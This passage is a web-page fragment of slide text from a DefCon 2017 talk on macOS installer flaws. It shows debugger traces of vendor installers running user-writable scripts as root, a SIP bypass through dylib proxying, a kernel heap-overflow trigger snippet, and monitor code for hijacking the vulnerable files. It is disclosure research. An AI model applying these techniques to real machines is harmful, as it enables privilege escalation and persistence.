+" href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_21.jpg">BUGS if(no CVE) then 0day;</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="dropcam
+INTERNET OF THINGS
+$ ls -lart /var/fold..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! dropcam
+INTERNET OF THINGS
+$ ls -lart /var/fold..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_22.jpg">dropcam INTERNET OF THINGS $ ls -lart /var/folders/yx/bp25tm5x4l32k5297qwc7wcd4m022r/T/dropcam_kwvZ7y/Setup Dropcam (Macintosh).app/Contents/MacOS/Setup</a>
+            </h3>
+            Dropcam (Macintosh) -rwxrwxrwx 1 patrick staff Setup Dropcam (Macintosh) permissions of (copied) installer $ lldb Setup Dropcam (Macintosh).app Launched parent Copying Setup Dropcam (Macintosh).app to /var/folders/yx/bp25tm5x4l32k5297qwc7wcd4m022r/T/dropcam_kwvZ7y Launching child with elevated privileges from /var/folders/yx/bp25tm5x4l32k5297qwc7wcd4m022r/T/ dropcam_kwvZ7y/Setup Dropcam (Macintosh).app/Contents/MacOS/Setup Dropcam (Macintosh) Process 96025 stopped (Security`AuthorizationExecuteWithPrivileges) (lldb) x/x $esp+8 0xbffff6c4: 0x0020ac50 (lldb) x/s 0x0020ac50 0x0020ac50: &quot;/var/folders/yx/bp25tm5x4l32k5297qwc7wcd4m022r/T/dropcam_kwvZ7y/Setup Dropcam (Macintosh).app/Contents/MacOS/Setup Dropcam (Macintosh)&quot; copy &amp; exec (auth&#39;d) installer from tmp dir! #_
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="google chrome
+BROWSERS
+# procmon
+new process: s..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! google chrome
+BROWSERS
+# procmon
+new process: s..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_23.jpg">google chrome BROWSERS # procmon new process: security_authtrampoline (1508) path:</a>
+            </h3>
+            /usr/libexec/security_authtrampoline pid: 24977 args: &quot;/Applications/Google Chrome.app/Contents/Versions/59.0.3071.115/Google Chrome Framework.framework/Resources/keystone_promote_preflight.sh&quot;, ... process monitor keystone_promote_preflight.sh } bash script owned by user -rwxr-xr-x@ 1 user executed as r00t [bug 593133] &quot;AuthorizationExecuteWithPrivileges is deprecated ...as per discussion no good replacement exists&quot; #wontfix (non-admin) install
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="little snitch
+SECURITY TOOLS
+big snitch ;)
+Laun..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! little snitch
+SECURITY TOOLS
+big snitch ;)
+Laun..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_24.jpg">little snitch SECURITY TOOLS big snitch ;) Launch Daemons 1</a>
+            </h3>
+            2 3 plist 2 3 firewall is elevated writes a plist to temporary (user-writable) location moves plist into launch daemons &amp; chowns it to r00t } installer/updater: &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/path/2/lsdaemon&lt;/string&gt; &lt;/array&gt; editable by all! 1
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="little snitch
+SECURITY TOOLS
+(lldb) b ptrace
+Br..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! little snitch
+SECURITY TOOLS
+(lldb) b ptrace
+Br..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_25.jpg">little snitch SECURITY TOOLS (lldb) b ptrace Breakpoint 1: =</a>
+            </h3>
+            libsystem_kernel.dylib`__ptrace (lldb) br com add 1 Enter your debugger command(s). &gt; thread return &gt; continue &gt; DONE disable anti-debug char -[ODShell writePlist:owner:mode:toFile:] { ... r14 = [NSTemporaryDirectory() stringByAppendingPathComponent: [NSString stringWithFormat:@&quot;at.obdev.LittleSnitchInstaller.temp.%@.plist&quot;, [arg5 lastPathComponent]]]; [arg2 writeToFile:r14 atomically:0x0]; } move plist &amp; chown (lldb) b -[ODShell _executeCommandAsRoot:] (lldb) * thread #1: -[ODShell _executeCommandAsRoot:]  stop reason = breakpoint 1.1 (lldb) po $rdx echo $$; { /bin/rm -f &quot;$PLIST&quot;; /bin/mv &quot;$TMPFILE&quot; &quot;$PLIST&quot;; /usr/sbin/chown root:wheel &quot;$PLIST&quot;; /bin/chmod 0644 &quot;$PLIST&quot;; } 2&gt;&amp;1 (lldb) po [[NSProcessInfo processInfo] environment] PLIST = &quot;/Library/LaunchDaemons/at.obdev.littlesnitchd.plist&quot;; TMPFILE = &quot;/var/folders/hp/vv2sj3014271lklmjkyfjfl80000gn/T/ at.obdev.LittleSnitchInstaller.temp.at.obdev.littlesnitchd.plist.plist&quot;; save plist to temporary location patched: CVE-2017-2675
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="vmware fusion
+VIRTUALIZATION SOFTWARE
+(lldb) b ..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! vmware fusion
+VIRTUALIZATION SOFTWARE
+(lldb) b ..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_26.jpg">vmware fusion VIRTUALIZATION SOFTWARE (lldb) b AuthorizationExecuteWithPrivileges * thread #1:</a>
+            </h3>
+            Security`AuthorizationExecuteWithPrivileges * stop reason = breakpoint 1.1 frame #0: 0x00007fff928cef77 Security`AuthorizationExecuteWithPrivileges (lldb) x/s $rsi &quot;/var/folders/yx/bp25tm5x4l32k5297qwc7wcd4m022r/T/fusionAutoupdate.JuFYAU/preflight&quot; $ ls -lart /var/folders/yx/bp25tm5x4l32k5297qwc7wcd4m022r/T/fusionAutoupdate.JuFYAU/preflight -r-xr-xr-x 1 user staff #_ scripts extracted to temp (user-writable) directory executed as r00t } executing world-writable scripts...as r00t
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="f-secure freedome
+VPN SOFTWARE
+# procmon
+new pr..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! f-secure freedome
+VPN SOFTWARE
+# procmon
+new pr..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_27.jpg">f-secure freedome VPN SOFTWARE # procmon new process: security_authtrampoline (2580)</a>
+            </h3>
+            path: /usr/libexec/security_authtrampoline pid: 24977 args: &quot;/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid&quot;, &quot;auth 11&quot;, &quot;/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid&quot;, &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;sh &#39;/Applications/Freedome.app/Contents/Resources/install_or_update_plists.sh&#39; &#39;/Applications/Freedome.app&#39;&quot; process monitor: &#39;install_or_update_plists.sh&#39; SettingsManager::createConfigsAndReinstallDaemonIfNeeded { ... lea rdi, &quot;do shell script &quot;%1&quot; with administrator privileges&quot; ... lea rdi, &quot;osascript&quot; ... lea rdi, &quot;-e&quot; ... call QProcess::start(QString const&amp;,QStringList const&amp;, ...) } freedome&#39;s disassembly exec script as root, via applescript
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="sophos av
+ANTI-VIRUS
+$ lldb &quot;~/Downloads/Sophos..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! sophos av
+ANTI-VIRUS
+$ lldb &amp;quot;~/Downloads/Sophos..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_28.jpg">sophos av ANTI-VIRUS $ lldb &quot;~/Downloads/SophosInstall/Sophos Installer.app&quot; Current executable set</a>
+            </h3>
+            to &#39;~/Downloads/SophosInstall/Sophos Installer.app&#39; (x86_64). (lldb) b AuthorizationExecuteWithPrivileges (lldb) r * thread #1: Security`AuthorizationExecuteWithPrivileges * stop reason = breakpoint 1.1 frame #0: 0x00007fff928cef77 Security`AuthorizationExecuteWithPrivileges (lldb) x/s $rsi 0x105b56f70: &quot;~/Downloads/SophosInstall/Sophos Installer.app/Contents/MacOS/tools/InstallationDeployer&quot; (lldb) x/2x $rcx 0x7fff5fbfebe0: 0x0000000100031477 0x0000000100031481 (lldb) x/s 0x0000000100031477 0x100031477: &quot;--install&quot; (lldb) x/s 0x0000000100031481 0x100031481: &quot;--ui&quot; SophosInstall.zip InstallationDeployer --install --ui #_
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="sparkle; ...used lots
+AUTO-UPDATE LIBRARY
+
+&quot;App..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! sparkle; ...used lots
+AUTO-UPDATE LIBRARY
+
+&amp;quot;App..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_29.jpg">sparkle; ...used lots AUTO-UPDATE LIBRARY &quot;Apps using Sparkle&quot; github.com/sparkle-project/Sparkle/issues/717 Acorn</a>
+            </h3>
+            Activity Audit Adapter Adium Air Display Host Air Video Server HD AirParrot 2 AirRadar AirServer Airfoil Airfoil Speakers Airfoil Video Player Alarm Clock Pro Alarm Clock Pro 2 Ambify Antidote 8 AppCleaner AppDelete AppViz AppZapper Archiver Art Text 2 Audio Hijack Audio Hijack Pro Audiomate Audirvana Plus Bartender Bartender 2 Battery Guardian Battery Report BeadedSpice Beamer Bento 3 BetterTouchTool BetterZip BibDesk Billings Bit Slicer BitTorrent Bitcasa Bittorrent Sync Bleep Blue Jeans Scheduler for Mac BoinxTV BootXChanger Borderlands Bowtie Boxer Bricksmith CCMenu CDpedia Cactus Cakebrew Camtasia 2 Capo Carbon Copy Cloner Carousel Cathode Chatology CheatSheet Chicken ChitChat Chocolat Cinch Cisco Jabber ClamXav CleanMyMac 2 Clippy CloudApp CloudyTabs Clyppan Cocktail CocoaPods Coconut ID CocosBuilder Coda 2 CodeKit CodeRunner Colloquy ColorFinale ColorMunki Display ColorMunki Smile Comic Life Conductr Server Contour ControlPlane ControllerMate CopyClip Core Data Editor Corel Painter Sketch Pad Cornerstone CoverScout 3 Crashlytics CrossOver Crunch Cyberduck DEVONthink DEVONthink Pro DS_Store Cleaner DaisyDisk Dash Dashlane Data Rescue 3 Default Folder X Deploymate DesignPro Deskovery Desktop Curtain DesktopShelves Disk Drill DiskAid DiskMaker X DockMod Downie DrawBerry Drive Genius 3 DropZone 3 DropletManager Dropshare Dropzone-2 DuetDisplay + DynDNSUpdater Elmedia Player Eloquent Ember Enjoy2 Evernote Evom Exhaust Fabric Fake Fantastical Feeder Feeder 3 Festify Final Vinyl FinderPath Fitbit Connect Flashlight Flavours2 FlexiGlass Fluid Flux Focus Focus 2 Font Finagler FontAgent Pro 6 FontStand ForkLift FotoMagico Fraise Framer Studio GPG Keychain GeekTool Geekbench Geekbench 3 Get Backup 2. Get iPlayer Automator GitUp Gitbox Gitter Glyphs Go2Shell Goofy GraphicConverter 7 GraphicConverter 8 GraphicConverter 9 GridMount GrowlMail Hammerspoon Handbrake Harvest Hedgewars Hex Fiend HipChat Hirundo Hobo Hocus Focus Hopper Hopper Disassembler v3 Hopper/Hopper Debugger Server HoudahGeo HoudahSpot Hypernap iExplorer iFunBox iPhone Backup Extractor iPhone Explorer iPlayer Automator iSale 5 iShowU HD iSkysoft iTube Studio iStopMotion iStumbler iSubtitle iTeleport Connect iTerm iTerm-2 iTools iVPN IP Scanner IPNetMonitor X IconJar Image2Icon ImageAlpha ImageOptim Impactor InVisible Infinit Inklet InsomniaX Intensify Pro Isolator Itsycal JPEGmini Pro JewelryBox JollysFastVNC Jumpcut Kaleidoscope Karabiner KeepingYouAwake Keka Kext Wizard KisMAC Knock LaTeXiT Last.fm LevelHelper LineIn LiquidCD LiteIcon Live Interior 3D Pro LiveReload Loading Lookback Loop Editor Lumio Lyve M3Unify MAMP MDRP MPEG2 Works 4 MPlayer OSX Extended MPlayerX MTR 5 MacDown MacJournal MacPilot MacVim Mactracker Mailbox MediaInfo Mac MenubarStats Messenger MetaZ Minbox MindNode Pro Minitube Miro Miro Video Converter Money MongoHub Monodraw Monolingual Mou Mou + MouseRecorder MoveToAppleMusic MyHarmony Myo Connect Name Mangler NameChanger NetNewsWire NetSpot NiceCast Notational Velocity NoteBook Notifyr Noun Project OSCulator OSCulator ƒ Octohub Octopus Opacity OpenDNS Updater 3.0 OpenEmu PDFpen Pacifist PaintCode PaintCode 2 Paintbrush Panda Mac Paparazzi! Paperless Paw Phone To Mac PhoneExpander PhoneView PhotoPresenter Phun PhysicsEditor Picturesque Piezo Platypus PlistEdit Pro Plug Poedit Power Manager Power Manager Professional PowerPhotos PowerTunes ProjectPlus PwnageTool QuickRadar Quicken 2007 Quicken 2016 Quinn Radium Rdio RealPlayer Cloud Reeder Reflector Reflector 2 Reggy Remote Activity RescueTime Retrode Utility Reveal RightFont Ring Rinoceros RipIt RoadMovie RoboFont S3Hub SMART Utility 2.1.2 SafariCacheExplorer Sandvox SaneDesk Scapple ScreenFlow Scrivener Seil SelfControl Senuti Sequel Pro Shapes Sharepod Sidestep Silverback Simple Comic Simul80 SizeUp Sketch Sketch Toolbox Skim SkyFonts Slack Sleep Monitor Snagit Snapheal Snapheal PRO Sofortbild SongGenie Soulver Sound Studio SoundSoap SourceTree SousChef Spark Splashtop Splice Stand Stay StoryMill StuffIt Expander Subler Subliminal Submerge Swift Publisher 3 TCMPortMapper TG Pro Tagalicious Tagger Tansmit TeX Live Utility TeXnicle TeamViewer TechTool Pro 8 Teleport TexShop Textual TexturePacker The Unarchiver Throng Timing Toast 14 Titanium Toast Titanium Tokens Tomahawk Tonality Pro Tower Trailer Trampoline Transmission Transmit Trello TripMode Triumph TunesKit for Mac TunnelBear Tunnelblick TurboTax 2012-2015, at least TwistedWave Twitterrific Typora uTorrent UnRarX UnicodeChecker Unison Übersicht VLC VLS Vagrant Manager VelOCRaptor Versions VideoMonkey VideoSpec Vienna Viscosity VisualHub Vitamin-R Vivaldi Vox VyprVPN Wallsaver Waltr WebKit WhatSize Whiskey Winclone Wine WineBottler WireTap Studio Witgui Wondershare AllMyTube Wondershare Data Recovery Wondershare Video Converter Ultimate X-LosslessDecoder XLD XQuartz Xslimmer Yarg Yate ZFS Plugin Zeplin Zoom Zulip Zwoptex oh f**k list from 2016 app (to be vulnerable) must use recent ver. of sparkle user
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="an example; hopper.app
+SPARKLE
+time to update!
+..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! an example; hopper.app
+SPARKLE
+time to update!
+..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_30.jpg">an example; hopper.app SPARKLE time to update! (lldb) process attach</a>
+            </h3>
+            --name Autoupdate --waitfor    Executable module set to &quot;/Users/user/Library/Caches/com.cryptic-apps.hopper-web-4/org.sparkle- project.Sparkle/Autoupdate.app/Contents/MacOS/Autoupdate&quot;. (lldb) b AuthorizationExecuteWithPrivileges Process 15771 stopped Security`AuthorizationExecuteWithPrivileges: (lldb) x/s $rsi &quot;/Users/user/Library/Caches/com.cryptic-apps.hopper-web-4/org.sparkle-project.Sparkle/ Autoupdate.app/Contents/MacOS/fileop update server Autoupdate.app fileop fileop modifiable by un-priv&#39;d code } executed as r00t user
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="hijacking auth&#39;d copies
+AND APPLE?
+user authent..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! hijacking auth&amp;#39;d copies
+AND APPLE?
+user authent..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_31.jpg">hijacking auth&#39;d copies AND APPLE? user authenticates item (naively) copied</a>
+            </h3>
+            } Slack.zip ...into /Applications $ shasum -a 1 ~/Downloads/Slack.app/Contents/MacOS/Slack 0a05ccc21943b543dd0326a7b5f7918d881d67f6 $ xattr -rc ~/Downloads/Slack.app $ cat - &gt;&gt; ~/Downloads/Slack.app/Contents/MacOS/Slack AAAAA^C $ shasum -a 1 /Applications/Slack.app/Contents/MacOS/Slack 8e605dad6112b601bbdd085dd0d3b97d5a1905e6 $ ps aux | grep Slack.app user 17150 /Applications/Slack.app/Contents/MacOS/Slack &#39;infected&#39; Slack runs ...for any user no verification, that the item wasn&#39;t modified user
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Installer.app
+AND APPLE?
+$ codesign -d --entitl..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! Installer.app
+AND APPLE?
+$ codesign -d --entitl..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_32.jpg">Installer.app AND APPLE? $ codesign -d --entitlements - /System/Library/CoreServices/Installer.app Executable=/System/Library/CoreServices/Installer.app/Contents/MacOS/Installer</a>
+            </h3>
+            &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;com.apple.private.securityd.stash&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt; &lt;/plist&gt; app&#39;s entitlements authentication handler for .pkgs $ less /System/Library/CoreServices/Installer.app/Contents/Info.plist &lt;key&gt;CFBundleDocumentTypes&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;CFBundleTypeExtensions&lt;/key&gt; &lt;array&gt; &lt;string&gt;pkg&lt;/string&gt; &lt;/array&gt; &lt;key&gt;LSIsAppleDefaultForType&lt;/key&gt; &lt;true/&gt; ... &lt;/dict&gt; ... default .pkg handler
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Installer.app loads unsigned dylibs??
+AND APPLE..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! Installer.app loads unsigned dylibs??
+AND APPLE..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_33.jpg">Installer.app loads unsigned dylibs?? AND APPLE? /Plugins (lldb) process attach</a>
+            </h3>
+            --name Installer --waitfor Process 460 stopped Foundation`-[NSFileManager createDirectoryAtPath: withIntermediateDirectories:attributes:error:] (lldb) po $rdx /tmp/com.apple.installerie9PZNtz/FollowUs.bundle ... Process 460 stopped libdyld.dylib`dlopen (lldb) x/s $rdi &quot;/tmp/com.apple.installerie9PZNtz/FollowUs.bundle installer doing what!? /tmp $ ls -lart /tmp/com.apple.installerie9PZNtz/FollowUs.bundle -rwxr-xr-x 1 user staff /tmp is writeable! unsigned dylib; loaded :/
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="BEYOND ROOT
+subverting &#39;s OS installer
+# tail -..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! BEYOND ROOT
+subverting &amp;#39;s OS installer
+# tail -..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_34.jpg">BEYOND ROOT subverting &#39;s OS installer # tail -f /var/log/install.log</a>
+            </h3>
+            InstallAssistant: Blessing /Volumes/Macintosh HD -- /Volumes/Macintosh HD/macOS Install Data InstallAssistant: ****** Setting Startup Disk ****** InstallAssistant: ****** Path: /Volumes/Macintosh HD InstallAssistant: ****** Boot Plist: /Volumes/Macintosh HD/macOS Install Data/com.apple.Boot.plist InstallAssistant: /usr/sbin/bless -setBoot -folder /Volumes/Macintosh HD/ macOS Install Data -bootefi /Volumes/Macintosh HD/macOS Install Data/boot.efi -options config=&quot;\macOS Install Data\com.apple.Boot&quot; -label macOS Installer Install macOS Sierra.app InstallESD.dmg &#39;new&#39; os codesign -d --entitlements - /Applications/Install\ macOS\ Sierra.app/Contents/Frameworks/OSInstallerSetup.framework/ Versions/A/Resources/osishelperd &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;com.apple.private.securityd.stash&lt;/key&gt; &lt;true/&gt; &lt;key&gt;com.apple.rootless.install&lt;/key&gt; &lt;true/&gt; &lt;key&gt;com.apple.rootless.install.heritable&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt; &lt;/plist&gt; blessing, to boot off InstallESD.dmg osishelperd&#39;s entitlements
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="subverting &#39;s OS installer
+BEYOND ROOT
+once the..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! subverting &amp;#39;s OS installer
+BEYOND ROOT
+once the..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_35.jpg">subverting &#39;s OS installer BEYOND ROOT once the system is</a>
+            </h3>
+            booted of an infected image, all &#39;OS-level&#39; protections are irrelevant create malicious library that forwards exports to (re-named) dylib rename dependent dylib move/rename malicious library to match (original) dylib 1 2 3 &#39;dylib proxying&#39; IASUtilities IASUtilities_ORIG OS Installer unless entitled runtime &#39;injection&#39; into OS Installer
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="subverting &#39;s OS installer
+BEYOND ROOT
+Install ..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! subverting &amp;#39;s OS installer
+BEYOND ROOT
+Install ..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_36.jpg">subverting &#39;s OS installer BEYOND ROOT Install macOS Sierra.app osishelperd</a>
+            </h3>
+            # ps aux | grep -i [j]ava root 90 /Library/Application Support/JavaW/JavaW # less /System/Library/LaunchDaemons/com.JavaW.plist &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/Library/Application Support/JavaW/JavaW&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; # rm /System/Library/LaunchDaemons/com.JavaW.plist rm: Operation not permitted osishelperd blesses infected images within installer app, infect os image (.dmg) system boots of infected image to reinstall OS 1 2 3 the attack: not validated ! bypass SIP survive an OS upgrade CVE-2017-6974 dylib proxy
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="a ring-0 heap overflow
+BEYOND ROOT
+void audit_a..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! a ring-0 heap overflow
+BEYOND ROOT
+void audit_a..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_37.jpg">a ring-0 heap overflow BEYOND ROOT void audit_arg_sockaddr(struct kaudit_record *ar,</a>
+            </h3>
+            struct vnode *cwd_vp, struct sockaddr *sa) { int slen; struct sockaddr_un *sun; bcopy(sa, &amp;ar-&gt;k_ar.ar_arg_sockaddr, sa-&gt;sa_len); switch (sa-&gt;sa_family) { case AF_UNIX: ... } struct kaudit_record { struct audit_record k_ar; u_int32_t k_ar_commit; ... }; struct audit_record { u_int32_t ar_magic; int ar_event; int ar_retval; ... struct sockaddr_storage ar_arg_sockaddr; int ar_arg_fd2; ... }; #define _SS_MAXSIZE 128 struct sockaddr_storage { u_char ss_len; sa_family_t ss_family; char __ss_pad1[_SS_PAD1SIZE]; int64_t __ss_align; char __ss_pad2[_SS_PAD2SIZE]; }; relevant structs bcopy() in audit_arg_sockaddr() source (&#39;src&#39;): struct sockaddr *sa destination (&#39;dst&#39;): struct sockaddr_storage k_ar.ar_arg_sockaddr audit_arg_sockaddr() bytes to copy (&#39;len&#39;): sa-&gt;sa_len
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="ring-0 heap overflow
+BEYOND ROOT
+can we make
+so..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! ring-0 heap overflow
+BEYOND ROOT
+can we make
+so..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_38.jpg">ring-0 heap overflow BEYOND ROOT can we make socket &gt;</a>
+            </h3>
+            _SS_MAXSIZE? #define SOCKET_SIZE 200 //create unix socket int unixSocket = socket(AF_UNIX, SOCK_STREAM, 0); //alloc/fill char* addr = malloc(SOCKET_SIZE); memset(addr, 0x41, SOCKET_SIZE); //init (addr)-&gt;sun_len = SOCKET_SIZE; (addr)-&gt;sun_family = AF_UNIX; //bind bind(unixSocket, addr, SOCKET_SIZE)); (lldb) x/xb 0xffffff801a4c26f8 0xffffff801a4c26f8: 0xfa 0x01 0x41 0x41 0x41 0x41 0x41 0x41 0xffffff801a4c2700: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 .... (lldb) x/i $pc -&gt; 0xffffff80063eb6da: 48 8b 00 movq (%rax), %rax (lldb) reg read $rax rax = 0x4141414141414141 kernel ptr = 0x4141414141414141 unix socket (200 bytes) patched 10.12.4/iOS(?) (AFAIK, no CVE/credit) yes!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="EXPLOITS
+making these useful
+" title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! EXPLOITS
+making these useful
+" href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_39.jpg">EXPLOITS making these useful</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="efficient exploitation, as limited-priv&#39;d code
+..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! efficient exploitation, as limited-priv&amp;#39;d code
+..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_40.jpg">efficient exploitation, as limited-priv&#39;d code GENERAL OVERVIEW 2 3 1</a>
+            </h3>
+            4 if(vulnerable app) then { watch for &#39;vulnerable&#39; file } then { infect &#39;vulnerable&#39; file } enjoy r00t! #_ go time!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="watch for vulnerable application
+APP MONITOR
+1
+..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! watch for vulnerable application
+APP MONITOR
+1
+..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_41.jpg">watch for vulnerable application APP MONITOR 1 -(void)register4Notifications { //register</a>
+            </h3>
+            for &#39;app launched&#39; notification [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(appEvent:) name:NSWorkspaceDidLaunchApplicationNotification object:nil]; //register for &#39;app terminated&#39; notification [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(appEvent:) name:NSWorkspaceDidTerminateApplicationNotification object:nil]; } -(void)appEvent:(NSNotification *)notification { //app name NSString* app = notification.userInfo[@&quot;NSApplicationName&quot;]; //ignore apps we don&#39;t care about if(YES != [app isEqualToString:TARGET_APP]){ //bail goto bail; } //launched if(YES == [notification.name isEqualToString:@&quot;NSWorkspaceDidLaunchApplicationNotification&quot;]){   //start monitoring // -&gt;wait for vulnerable file } //exited else { //stop monitoring } .... } application start/stop monitor
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="watch for vulnerable file (!polling)
+FILE MONIT..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! watch for vulnerable file (!polling)
+FILE MONIT..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_42.jpg">watch for vulnerable file (!polling) FILE MONITOR 2 -(void)register4Notifications {</a>
+            </h3>
+            CFStringRef path = CFStringCreateWithCString(kCFAllocatorDefault, TARGET_FILE, kCFStringEncodingUTF8); CFArrayRef paths = CFArrayCreate(NULL, (const void **)&amp;path, 1, &amp;kCFTypeArrayCallBacks); CFRunLoopRef loop = CFRunLoopGetCurrent() ; FSEventStreamRef stream = FSEventStreamCreate(NULL, (FSEventStreamCallback)eventCallback, NULL, paths, kFSEventStreamEventIdSinceNow, 0, kFSEventStreamCreateFlagFileEvents ); FSEventStreamScheduleWithRunLoop(stream, loop, kCFRunLoopDefaultMode); FSEventStreamStart(stream); CFRunLoopRun(); ... } void eventCallback(FSEventStreamRef stream, void* callbackInfo, size_t numEvents, void* paths, const FSEventStreamEventFlags eventFlags[], const FSEventStreamEventId eventIds[]) { //process events for(int i = 0; i&lt;numEvents; i++){ //item creation event? if(0 != (eventFlags[i] &amp; 0x100 )){ //target file created // -&gt;hijack/infect } } FSEventStreamFlushSync( stream ) ; file monitor
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="infect script/plist/binary...root!
+FILE INFECTI..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! infect script/plist/binary...root!
+FILE INFECTI..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_43.jpg">infect script/plist/binary...root! FILE INFECTION 3 } scripts/plists } machO binaries</a>
+            </h3>
+            remove xattrs (avoid gKeeper validations) unsign don&#39;t we have to win a race? # &#39;massive&#39; time window ...always win :) yes, but....
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="side-stepping &#39;app translocation&#39;
+MAKING TARGET..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! side-stepping &amp;#39;app translocation&amp;#39;
+MAKING TARGET..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_44.jpg">side-stepping &#39;app translocation&#39; MAKING TARGETS WRITABLE write-only &#39;app translocation&#39; }</a>
+            </h3>
+            CVE 2015-3715 (wardle) CVE 2015-7024 (wardle) testApp: app is translocated! testApp: original URL: ~/Downloads/testApp.app/ testApp: translocated URL: file:///private/var/folders/r3/9nbl60856zn82n6wdtwrxw8w0000gn/T/ AppTranslocation/7E2258D4-DD10-4B39-B659-F9C9C1CC7A9F/d/testApp.app/ translocated app $ xattr ~/Downloads/targetApp.zip ... com.apple.quarantine $ xattr -rc ~/Download/targetApp.zip 1 2 remove xattrs prevents translocation (writable) prevents gatekeeper validation
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="intercepting .dmg mounts to achieve R/W
